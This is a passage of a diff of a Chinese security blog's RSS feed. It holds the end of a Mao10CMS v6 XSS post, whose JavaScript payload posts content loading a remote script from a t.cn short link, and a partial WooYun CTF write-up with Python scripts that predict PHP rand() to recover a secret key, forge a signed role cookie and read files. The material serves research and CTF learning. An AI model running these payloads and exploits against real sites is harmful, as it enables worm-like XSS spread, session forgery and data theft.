-    &lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Microsoft.XMLHTTP&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-type&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;post_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;var m = new Image();
+m.src = document.getElementsByTagName('link')[0].href + &amp;quot;/../../../do/add_guanzhu.php?id=2&amp;quot;;
+var url = document.getElementsByTagName('link')[0].href + &amp;quot;/../../../do/activity.php&amp;quot;;
+var post_str = &amp;quot;content=hi%3Cscript%20src%3D%27http%3A%2f%2ft.cn%2fRch1cI9%27%3E%3C%2fscript%3E&amp;quot;;
+var ajax = null;
+if (window.XMLHttpRequest) {
+    ajax = new XMLHttpRequest();
+}
+else if (window.ActiveXObject) {
+    ajax = new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);
+}
+ajax.open(&amp;quot;POST&amp;quot;,url,true);
+ajax.setRequestHeader(&amp;quot;Content-type&amp;quot;,&amp;quot;application/x-www-form-urlencoded&amp;quot;);
+ajax.send(post_str);&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 </description>
         
-        <pubDate>Wed, 31 Aug 2016 00:00:00 -0400</pubDate>
+        <pubDate>Wed, 31 Aug 2016 00:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/mao10cms-v6-xss.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/mao10cms-v6-xss.html</guid>
@@ -1267,9 +1454,583 @@ patching file ext/simplexml/simplexml.c
         
           <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
 
+&lt;hr /&gt;
+
+&lt;p&gt;先献上flag，以表正义（我有一颗世界和平的心）&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Congratulate you, flag is cb6afe419450c23f462159afb9976130&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;很高兴能够参加这次WooYun Puzzle，从P师傅出的题目中学到些许东西，下面分三步来突破&lt;a href=&quot;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/&quot;&gt;安全盒子的秘密&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x01-&quot;&gt;0x01 引诱&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;题目伊始上来一个“安全盒子”，不清楚具体是什么鬼，先随便提交试试&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160628/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;提交后报错说权限拒绝，向这种摸不着头脑的猜测会有源码来告诉你具体逻辑，F12后发现访问源码方法&lt;code&gt;&amp;lt;!-- ?x_show_source --&amp;gt;&lt;/code&gt;：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160628/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;随机访问&lt;code&gt;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/?x_show_source&lt;/code&gt;后得到源码为：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
+/**
+ * Created by PhpStorm.
+ * User: phithon
+ * Date: 16/6/8
+ * Time: 上午12:24
+ */ 
+
+//控制报错显示源码
+error_reporting(-1);
+ini_set(&amp;quot;display_errors&amp;quot;, 1);
+if(isset($_GET['x_show_source'])) {
+    show_source(__FILE__);
+    exit;
+}   
+
+//为每次会话开启session
+session_start();
+
+//根据rand_str()生成6位SECRET_KEY和16位CSRF_TOKEN
+if(empty($_SESSION['SECRET_KEY'])) {
+    $_SESSION['SECRET_KEY'] = rand_str(6);
+}
+if(empty($_SESSION['CSRF_TOKEN'])) {
+    $_SESSION['CSRF_TOKEN'] = rand_str(16);
+}   
+
+//包含点，其中可能存在flag
+include_once &amp;quot;flag.php&amp;quot;;    
+
+//使用rand()函数随机生成指定长度字符串
+function rand_str($length = 16)
+{
+    $rand = [];
+    $_str = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;;
+    for($i = 0; $i &amp;lt; $length; $i++) {
+        $n = rand(0, strlen($_str) - 1);
+        $rand[] = $_str{$n};
+    }
+    return implode($rand);
+}   
+
+//对ajax的请求以json形式相应，否则直接转换成字符串输出
+function output($obj)
+{
+    if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) &amp;amp;&amp;amp;
+        strcasecmp($_SERVER['HTTP_X_REQUESTED_WITH'], 'XMLHttpRequest') === 0) {
+        header(&amp;quot;Content-Type: application/json&amp;quot;);
+        echo json_encode($obj);
+    } else {
+        header(&amp;quot;Content-Type: text/html; charset=UTF-8&amp;quot;);
+        echo strval($obj);
+    }
+}   
+
+//每次提交check之后，将CSRF_TOKEN置为null
+function check_csrf_token()
+{
+    if(empty($_SESSION['CSRF_TOKEN']) || $_POST['CSRF_TOKEN'] !== $_SESSION['CSRF_TOKEN']) {
+        return false;
+    } else {
+        $_SESSION['CSRF_TOKEN'] = null;
+        return true;
+    }
+}   
+
+//显示form页面
+function show_form_page()
+{
+    ?&amp;gt;
+    &amp;lt;!DOCTYPE html&amp;gt;
+    &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+    &amp;lt;head&amp;gt;
+        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+        &amp;lt;title&amp;gt;safebox&amp;lt;/title&amp;gt;
+        &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;style.css&amp;quot;&amp;gt;
+    &amp;lt;/head&amp;gt;
+    &amp;lt;body&amp;gt;  
+
+    &amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
+        &amp;lt;form method=&amp;quot;post&amp;quot;&amp;gt;
+        &amp;lt;div class=&amp;quot;block title&amp;quot;&amp;gt;
+            安全箱子
+        &amp;lt;/div&amp;gt;
+        &amp;lt;div class=&amp;quot;block show&amp;quot;&amp;gt;
+            &amp;lt;div class=&amp;quot;line&amp;quot;&amp;gt;
+                &amp;lt;label&amp;gt;输入验证字符串: &amp;lt;/label&amp;gt;
+                &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;key&amp;quot;&amp;gt;
+            &amp;lt;/div&amp;gt;
+            &amp;lt;div class=&amp;quot;line&amp;quot;&amp;gt;
+                &amp;lt;label&amp;gt;输入方法　　　: &amp;lt;/label&amp;gt;
+                &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;act&amp;quot;&amp;gt;
+            &amp;lt;/div&amp;gt;
+        &amp;lt;/div&amp;gt;
+        &amp;lt;div class=&amp;quot;block info&amp;quot;&amp;gt;
+            &amp;lt;input type=&amp;quot;reset&amp;quot; value=&amp;quot;重置&amp;quot;&amp;gt;
+            &amp;lt;input name=&amp;quot;submit&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt;
+            &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;CSRF_TOKEN&amp;quot; value=&amp;quot;&amp;lt;?php echo $_SESSION['CSRF_TOKEN'] ?&amp;gt;&amp;quot;&amp;gt;
+        &amp;lt;/div&amp;gt;
+        &amp;lt;/form&amp;gt;
+    &amp;lt;/div&amp;gt;  
+
+    &amp;lt;/body&amp;gt;
+    &amp;lt;/html&amp;gt;
+    &amp;lt;?php
+}   
+
+//显示报错页面
+function show_error_page($msg)
+{
+    ?&amp;gt;
+    &amp;lt;!DOCTYPE html&amp;gt;
+    &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+    &amp;lt;head&amp;gt;
+        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+        &amp;lt;title&amp;gt;Error&amp;lt;/title&amp;gt;
+        &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;style.css&amp;quot;&amp;gt;
+        &amp;lt;!-- ?x_show_source --&amp;gt;
+    &amp;lt;/head&amp;gt;
+    &amp;lt;body&amp;gt;  
+
+    &amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
+        &amp;lt;div class=&amp;quot;block title&amp;quot;&amp;gt;
+            Error
+        &amp;lt;/div&amp;gt;
+        &amp;lt;div class=&amp;quot;block show&amp;quot;&amp;gt;
+            &amp;lt;?php echo $msg; ?&amp;gt;
+        &amp;lt;/div&amp;gt;
+        &amp;lt;div class=&amp;quot;block info&amp;quot;&amp;gt;
+            &amp;lt;a href=&amp;quot;javascript:history.back(-1)&amp;quot;&amp;gt;返回&amp;lt;/a&amp;gt;
+        &amp;lt;/div&amp;gt;
+    &amp;lt;/div&amp;gt;  
+
+    &amp;lt;/body&amp;gt;
+    &amp;lt;/html&amp;gt;
+    &amp;lt;?php
+    exit;
+}   
+
+$act = isset($_POST['act']) ? $_POST['act'] : &amp;quot;&amp;quot;;
+$key = isset($_POST['key']) ? $_POST['key'] : &amp;quot;&amp;quot;;
+if(isset($_POST['submit']) &amp;amp;&amp;amp; check_csrf_token()) {                 //csrf_token校验
+    if(hash_hmac('md5', $act, $_SESSION['SECRET_KEY']) === $key) {  //hmac_md5校验
+        if(function_exists($act)) {                                 //函数存在性校验
+            $exec_res = $act();                                     //调用指定函数
+            output($exec_res);                                      //输出函数返回结果
+        } else {
+            show_error_page(&amp;quot;Function not found!!&amp;quot;);
+        }
+    } else {
+        show_error_page(&amp;quot;Permission deny!!&amp;quot;);
+    }
+} else {
+    show_form_page();
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;所以重点在与最后的指定函数调用，分析如下：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;csrf_token校验：这里保证了提交的crsf_token的正确性，但小白我没有看出存在csrf的场景，token略显可疑&lt;/li&gt;
+  &lt;li&gt;hmac_md5校验：对于&lt;a href=&quot;http://www.cnblogs.com/soundcode/p/3802344.html&quot;&gt;HMAC-MD5&lt;/a&gt;，自认为算法上不存在什么缺陷，又是&lt;code&gt;===&lt;/code&gt;进行判断，就使得我们必须知道&lt;code&gt;$_SESSION['SECRET_KEY']&lt;/code&gt;的确切值，才能进入之后的if逻辑&lt;/li&gt;
+  &lt;li&gt;函数存在性校验：先检验载调用函数，而这里具有利用价值的估计就是包含在flag.php中的函数了&lt;/li&gt;
+  &lt;li&gt;调用指定函数：无参数传递，感觉会是个小坑哈&lt;/li&gt;
+  &lt;li&gt;输出函数返回结果：两种输出方式二选其一，猜测作者这里也另有目的&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;在程序中，对于每一个session都会先生成6位SECRET_KEY保持不变，在每次提交后对16位的CSRF_TOKEN进行变化。要知道SECRET_KEY的确切值，我首先想到的是暴力破解，虽然62**6不是太大，可是后续的套具体还不知道，而且出题人也不会这么无聊，尝试了一下就放弃了这个想法。既然不能猜那就预测呗，我的痛苦经历让我想到了一次CTF的rand()预测题目，具体原理与题目可见：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.freebuf.com/articles/web/99093.html&quot;&gt;http://www.freebuf.com/articles/web/99093.html&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.mscs.dal.ca/~selinger/random/&quot;&gt;http://www.mscs.dal.ca/~selinger/random/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;有没感觉很像，CTF题目中是多次输出rand()的值，再结合其生成算法，根据其之前生成的值预测之后的值：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;O_31 = O_0 + O_28 mod 2**31
+O_32 = O_1 + O_29 mod 2**31
+O_33 = O_2 + O_30 mod 2**31
+O_34 = O_3 + O_31 mod 2**31 
+O_35 = O_4 + O_32 mod 2**31
+O_36 = O_5 + O_33 mod 2**31&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;而我们这里呢，是每次提交后CSRF_TOKEN都会变化，而token中的字符根据对应关系也就是由rand()生成的值。但他们是向后预测，我们好像是向前推理，那该怎么办呢？加法会减法就不会啦?！&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;O_0 = O_31 - O_28 mod 2**31
+...
+O_5 = O_36 - O_33 mod 2**31&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;可是我们这里的rand()是有范围的那该如何呢，&lt;a href=&quot;https://www.google.com/webhp?sourceid=chrome-instant&amp;amp;ion=1&amp;amp;espv=2&amp;amp;ie=UTF-8#q=php%20rand%20source%20code&quot;&gt;搜一搜&lt;/a&gt;翻出对应的&lt;a href=&quot;https://github.com/php/php-src/blob/PHP-5.6.21/ext/standard/rand.c&quot;&gt;源码&lt;/a&gt;即可找到答案：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160628/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160628/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;对于&lt;code&gt;n' = a + n(b-a+1)/(M+1)&lt;/code&gt;，我们先令a=0,b=61化简成&lt;code&gt;n' = 62n/(M+1)&lt;/code&gt;,把运算用于整个公式，我再偷一下懒最后使用&lt;code&gt;(o[31+i]+62-o[28+i])%62&lt;/code&gt;来推算前6位的SECRET_KEY，初步代码（new-1.py）如下：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;import re
+import requests
+import hmac
+import sys
+reload(sys)
+sys.setdefaultencoding('utf-8') 
+
+url = &amp;quot;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/&amp;quot;
+session = requests.session()
+str_list = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;
+re_csrf_token = r'(?&amp;lt;=value=&amp;quot;).*?(?=&amp;quot;)'
+action = sys.argv[1]    
+
+def parse(token,s):
+    d = []
+    for i in xrange(len(token)):
+        for j in xrange(len(s)):
+            if token[i] == s[j]:
+                d.append(j)
+                break
+    return d    
+
+def guess(d,s,a):
+    result = []
+    for i in xrange(6):
+        r = (d[31+i]+62-d[28+i])%62
+        result.append(r)
+    key = ''.join(s[j] for j in result) 
+
+    return hmac.new(key,a).hexdigest()  
+
+r0 = session.get(url)
+token0 = re.findall(re_csrf_token,r0.text)[-1]
+d0 = parse(token0,str_list)
+payload0 = {'submit':'go', 'CSRF_TOKEN':token0, 'act':action, 'key':'1234567'}
+session.post(url,data=payload0)
+r1 = session.get(url)
+token1 = re.findall(re_csrf_token,r1.text)[-1]
+d1 = parse(token1,str_list)
+pre =  [0,0,0,0,0,0]+d0+d1
+key = guess(pre,str_list,action)
+payload1 = {'submit':'go', 'CSRF_TOKEN':token1, 'act':action, 'key':key}
+r2 = session.post(url,data=payload1)    
+
+if 'Permission deny!!' not in r2.text:
+    print '[+]Done!'
+    print r2.text&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;由于rand生成算法中有加1的随机情况存在，所以这里就需要多推测几次得到正确的SECRET_KEY，进入if逻辑调用函数，所以再写一个初步的代码（get-1.py）重复测试&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/env python
+#coding=utf-8   
+
+import sys
+import subprocess   
+
+while 1:
+    output = subprocess.check_output(['python',sys.argv[1],sys.argv[2]])
+    if output:
+        print output
+        break&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;运行得到如下输出：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ python get-1.py new-1.py flag
+[+]Done!
+    &amp;lt;!DOCTYPE html&amp;gt;
+    &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+    &amp;lt;head&amp;gt;
+        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
+        &amp;lt;title&amp;gt;Error&amp;lt;/title&amp;gt;
+        &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;style.css&amp;quot;&amp;gt;
+        &amp;lt;!-- ?x_show_source --&amp;gt;
+    &amp;lt;/head&amp;gt;
+    &amp;lt;body&amp;gt;  
+
+    &amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt;
+        &amp;lt;div class=&amp;quot;block title&amp;quot;&amp;gt;
+            Error
+        &amp;lt;/div&amp;gt;
+        &amp;lt;div class=&amp;quot;block show&amp;quot;&amp;gt;
+            Function not found!!        &amp;lt;/div&amp;gt;
+        &amp;lt;div class=&amp;quot;block info&amp;quot;&amp;gt;
+            &amp;lt;a href=&amp;quot;javascript:history.back(-1)&amp;quot;&amp;gt;返回&amp;lt;/a&amp;gt;
+        &amp;lt;/div&amp;gt;
+    &amp;lt;/div&amp;gt;  
+
+    &amp;lt;/body&amp;gt;
+    &amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;显然我这样瞎猜函数不会是个头，那就必须知道flag.php中是否有函数可供我们利用呢，所以我们就得知道哪些函数可以查看当前脚本中定义的函数，变量，常量等信息，百度一下你就知道：&lt;a href=&quot;http://www.jb51.net/article/42890.htm&quot;&gt;PHP输出当前进程所有变量/常量/模块/函数/类的示例&lt;/a&gt;，正好还都是不需要参数的。我首先利用get_defined_vars()和get_defined_constants()看看能不能直接脱出flag变量或者常量，然而并没有我想象的那么简单。那就用get_defined_functions看看吧：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ python get-1.py new-1.py get_defined_functions
+[+]Done!
+&amp;lt;br /&amp;gt;
+&amp;lt;b&amp;gt;Notice&amp;lt;/b&amp;gt;:  Array to string conversion in &amp;lt;b&amp;gt;/app/index.php&amp;lt;/b&amp;gt; on line &amp;lt;b&amp;gt;45&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;
+Array&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;这里函数的结果是个数组，而strval()对数组的变换同一是”Array”。那就试试让其用json响应呗，根据&lt;a href=&quot;http://stackoverflow.com/questions/28610376/sending-an-jquery-ajax-get-request-with-python-request-library&quot;&gt;stackoverflow&lt;/a&gt;上大神的回答，我们加个&lt;code&gt;'X-Requested-With': 'XMLHttpRequest'&lt;/code&gt;的header就好了，输出如下（有省略）：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ python get-1.py new-1.py get_defined_functions
+[+]Done!
+{&amp;quot;internal&amp;quot;:[&amp;quot;zend_version&amp;quot;,...],&amp;quot;user&amp;quot;:[&amp;quot;rand_str&amp;quot;,&amp;quot;output&amp;quot;,&amp;quot;check_csrf_token&amp;quot;,&amp;quot;show_form_page&amp;quot;,&amp;quot;show_error_page&amp;quot;,&amp;quot;_fd_init&amp;quot;,&amp;quot;fd_show_source&amp;quot;,&amp;quot;fd_config&amp;quot;,&amp;quot;fd_error&amp;quot;,&amp;quot;fg_safebox&amp;quot;]}&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;主要关注的是最后一个数组中用户定义的函数，哎呦，有个fd_show_source的函数，试试没准flag就出来了。&lt;/p&gt;
+
+&lt;h1 id=&quot;x02-&quot;&gt;0x02 绕过&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;事情并没有我们想象的那么简单，看来是作者又给我们下了一个套，fd_show_source函数输出整理如下（已加个人注解）：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
+/**
+ * Created by PhpStorm.
+ * User: phithon
+ * Date: 16/6/8
+ * Time: 上午12:24
+ */ 
+
+class SafeBox { 
+
+    //貌似可产生任意文件读取
+    private function _read_file($filename)
+    {
+        $filename = dirname(__FILE__) . &amp;quot;/&amp;quot; . $filename;
+        return file($filename);
+    }   
+
+    //通过POST filename可读取任意文件
+    public function read()
+    {
+        $filename = isset($_POST['filename']) ? $_POST['filename'] : &amp;quot;box.txt&amp;quot;;
+        return $this-&amp;gt;_read_file($filename);
+    }   
+
+    public function view()
+    {
+        $lines = $this-&amp;gt;_read_file('box.txt');
+        $i = isset($_POST['i']) ? intval($_POST['i']) : 0;
+        return isset($lines[$i]) ? $lines[$i] : &amp;quot;None&amp;quot;;
+    }   
+
+    public function alist()
+    {
+        $lines = $this-&amp;gt;_read_file('box.txt');
+        return $lines;
+    }   
+
+    public function random()
+    {
+        $lines = $this-&amp;gt;_read_file('box.txt');
+        return $lines[array_rand($lines)];
+    }
+}   
+
+function _fd_init()
+{
+    //定义role必须为guest
+    $_SESSION[&amp;quot;userinfo&amp;quot;] = [
+        &amp;quot;role&amp;quot; =&amp;gt; &amp;quot;guest&amp;quot;
+    ];                                                                                  //初始化role为guest
+    $cookie = isset($_COOKIE['userinfo']) ? base64_decode($_COOKIE['userinfo']) : &amp;quot;&amp;quot;;   //base64解码cookie userinfo
+    if(empty($cookie) || strlen($cookie) &amp;lt; 32) {
+        return false;
+    }   
+
+    $h1 = substr($cookie, 0, 32);                                                       //前32位为h1
+    $h2 = substr($cookie, 32);                                                          //后32位为h2
+    if($h1 !== hash_hmac(&amp;quot;md5&amp;quot;, $h2, $_SESSION['SECRET_KEY'])) {                        //再次hamc_md5校验(1)
+        return false;
+    }   
+
+    //防止身份伪造
+    if(strpos($h2, &amp;quot;admin&amp;quot;) !== false || strpos($h2, &amp;quot;user&amp;quot;) !== false) {               //防止h2中出现&amp;quot;admin&amp;quot;和&amp;quot;user&amp;quot;(2)
+        return false;
+    }
+    $s = json_decode($h2, true);                                                        //json解码h2，并转换成数组
+    $s['role'] = strval($s['role']);                                                    //$s['role']转为字符串(3)
+    if($s['role'] == 'admin') {                                                         //再次进行身份对比
+        return false;
+    }
+    $_SESSION[&amp;quot;userinfo&amp;quot;] = array_merge($_SESSION[&amp;quot;userinfo&amp;quot;], $s);                     //用h2中的role替换session中userinfo的role
+    return true;
+}   
+
+function fd_show_source()
+{
+    return file_get_contents(__FILE__);
+}   
+
+//包含config.php 其中可能有flag？
+function fd_config()
+{
+    return include_once __DIR__ . &amp;quot;/config.php&amp;quot;;
+}   
+
+function fd_error($msg)
+{
+    return &amp;quot;Error: {$msg}&amp;quot;;
+}   
+
+function fg_safebox()
+{
+    _fd_init();                                                                         //初始化
+    $config = fd_config();
+    $action = isset($_POST['method']) ? $_POST['method'] : &amp;quot;&amp;quot;;                          //指定action
+    $role = isset($_SESSION[&amp;quot;userinfo&amp;quot;]['role']) ? $_SESSION[&amp;quot;userinfo&amp;quot;]['role'] : &amp;quot;&amp;quot;;
+    if(!in_array($role, ['admin', 'user'])) {                                           //判断是否具有权限(1)
+        return fd_error('Permission denied!!');
+    }
+    if(in_array($action, $config['role']['admin']) &amp;amp;&amp;amp; $role != &amp;quot;admin&amp;quot;) {               //判读行为权限(2)
+        return fd_error('Admin permission denied!!');
+    }
+    $box = new SafeBox();
+    if(method_exists($box, $action)) {                                                  //判断对象方法是否存在(3)
+        return call_user_func([$box, $action]);                                         //调用相应方法(4)
+    } else {
+        return null;
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;首先在初始化_fd_init()中，要点分析如下：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;再次hamc_md5校验：这里的校验好说，毕竟&lt;code&gt;SECRET_KEY&lt;/code&gt;已经知晓，带上个&lt;code&gt;h1&lt;/code&gt;就好&lt;/li&gt;
+  &lt;li&gt;防止h2中出现”admin”和”user”：这里使用了strpos来查看字符串中是否存在身份伪造，而且使用&lt;code&gt;！==&lt;/code&gt;很规范，从源码基本也没看出什么破绽&lt;/li&gt;
+  &lt;li&gt;$s[‘role’]转为字符串：strval会将数组类型变得没有意义，也就想不出办法绕过对”admin”身份的检验&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;在fg_safebox()中第一关就是要判断其身份，要求其为”admin”或”user”。结合以上的分析，admin的两次检验我是绕不过去了我认了。所以就开始琢磨能不能使最终的&lt;code&gt;$role&lt;/code&gt;为”user”,而strpos约束我们在$h2中不能出现”user”,要不然我们编码试试？哈哈，这里的&lt;code&gt;$s = json_decode($h2, true);&lt;/code&gt;就是等着我们利用的，可以将”user”进行unicode编码成为&lt;code&gt;\u0075\u0073\u0065\u0072&lt;/code&gt;,这样在strpos中就不会检验出来，而且经过json_decode最终还原成”user”。&lt;/p&gt;
+
+&lt;p&gt;在(2)判读行为权限中，加入$box对象的read方法不在$config[‘role’][‘admin’]数组内，那么就不会判断&lt;code&gt;$role != &quot;admin&quot;&lt;/code&gt;，进而产生绕过。我们再修改一下原先的代码（new-2.py）如下：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;import re
+import requests
+import hmac
+import base64
+import sys
+reload(sys)
+sys.setdefaultencoding('utf-8') 
+
+url = &amp;quot;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/&amp;quot;
+session = requests.session()
+str_list = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;
+re_csrf_token = r'(?&amp;lt;=value=&amp;quot;).*?(?=&amp;quot;)'
+header = {'X-Requested-With': 'XMLHttpRequest'}
+action = sys.argv[1]
+method = sys.argv[2]    
+
+def parse(token,s):
+    d = []
+    for i in xrange(len(token)):
+        for j in xrange(len(s)):
+            if token[i] == s[j]:
+                d.append(j)
+                break
+    return d    
+
+def guess(d,s,a):
+    result = []
+    for i in xrange(6):
+        r = (d[31+i]+62-d[28+i])%62
+        result.append(r)
+    key = ''.join(s[j] for j in result) 
+
+    return (key,hmac.new(key,a).hexdigest())    
+
+def create_cookie(k):
+    h2 = r'{&amp;quot;role&amp;quot;:&amp;quot;\u0075\u0073\u0065\u0072&amp;quot;}'
+    h1 = hmac.new(k,h2).hexdigest()
+    return {'userinfo':base64.b64encode(h1+h2)} 
+
+r0 = session.get(url)
+token0 = re.findall(re_csrf_token,r0.text)[-1]
+d0 = parse(token0,str_list)
+payload0 = {'submit':'go', 'CSRF_TOKEN':token0, 'act':action, 'key':'1234567'}
+session.post(url,data=payload0)
+r1 = session.get(url)
+token1 = re.findall(re_csrf_token,r1.text)[-1]
+d1 = parse(token1,str_list)
+pre =  [0,0,0,0,0,0]+d0+d1
+secret,key = guess(pre,str_list,action)
+cookie = create_cookie(secret)
+payload1 = {'submit':'go', 'CSRF_TOKEN':token1, 'act':action, 'method':method, 'key':key}
+r2 = session.post(url,data=payload1,headers=header,cookies=cookie)  
+
+if 'Permission deny!!' not in r2.text:
+    print '[+]Done!'
+    print r2.text&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;相应的get-2.py也简单如下：&lt;/p&gt;
+
+&lt;div&gt;
